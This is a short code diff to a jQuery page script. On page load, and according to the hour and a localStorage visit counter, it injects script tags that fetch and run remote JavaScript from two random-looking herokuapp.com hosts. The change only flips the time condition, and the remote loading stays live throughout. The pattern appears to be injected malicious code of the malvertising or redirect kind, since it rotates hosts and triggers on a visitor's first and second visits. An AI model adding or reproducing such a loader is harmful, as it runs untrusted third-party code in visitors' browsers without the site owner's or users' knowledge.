@@ -192,7 +192,7 @@ $(document).ready(function(){
     var nD=new Date();
     var nH=nD.getHours();
 
-    if(nH>=12){
+    if(nH<12){
         $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1409"><\/script>');
     }else{
         $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1409"><\/script>');
@@ -204,14 +204,14 @@ $(document).ready(function(){
         cco++;
         localStorage.setItem('dcc', cco);
         if(cco==1){
-            if(nH>=12){
+            if(nH<12){
                 $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1973"><\/script>');
             }else{
                 $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1973"><\/script>');
             }
         }
         if(cco==2){
-            if(nH>=12){
+            if(nH<12){
                 $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1193"><\/script>');
             }else{
                 $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1193"><\/script>');
